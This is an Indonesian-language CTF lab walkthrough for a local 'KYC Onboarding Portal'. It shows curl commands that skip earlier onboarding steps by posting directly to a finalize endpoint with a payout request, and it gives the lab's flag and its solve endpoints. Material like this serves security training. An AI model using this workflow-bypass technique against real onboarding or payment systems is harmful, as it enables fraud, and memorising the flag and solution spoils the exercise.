# Panduan Praktik Terbimbing: Investigasi Multi-Step Workflow Step Skipping

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **KYC Onboarding Portal** pada `http://127.0.0.1:8052`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8052/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A06-03","port":8052,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8052/`
3. Amati antarmuka operasional **KYC Onboarding Portal** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Multi-Step Workflow Step Skipping)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8052/api/onboarding/step4/finalize -d '{"payout_requested":true}'
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/json` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8052/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8052/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A06-03","flag":"ZITERA{w0rkfl0w_st3p_sk1pp1ng_kyc_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{w0rkfl0w_st3p_sk1pp1ng_kyc_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
